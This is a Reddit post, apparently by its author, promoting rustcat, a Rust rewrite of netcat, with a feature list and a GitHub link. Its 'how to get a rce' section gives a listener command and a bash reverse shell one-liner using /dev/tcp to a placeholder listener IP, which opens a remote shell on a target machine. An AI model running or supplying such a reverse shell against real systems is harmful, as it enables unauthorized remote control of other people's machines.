    "selftext": "As you guys may know **netcat** is a thing... I pretty old thing.\n\nSo I decided to make a newer more modern netcat alternative in rust (**rustcat**)\n\n[Example](https://preview.redd.it/arsl2vp3cm371.png?width=295&format=png&auto=webp&s=131d60f8479aabf4ea8196cfe27841d991fa268c)\n\nWhy should you use rustcat instead of netcat:\n\n* It is more modern\n* Made in rust\n* Has colors to make it fancier\n* Daily Maintained\n\nHow to get a rce with it?\n\n* Start up a listner on specified port ex. (rc -lp 55600)\n* Open a reverse shell on a target machine with for example(/bin/bash -c 'bash -i >& /dev/tcp/your-ip-running-the-listener/55600 0>&1')\n* Boom you got yourself a nice rce  \n\n\nMore features will be added in the future.Also remember to give the repo a star\u2b50 and create a issue if you have an **idea** or **find a bug**\n\n[https://github.com/robiot/rustcat](https://github.com/robiot/rustcat)"
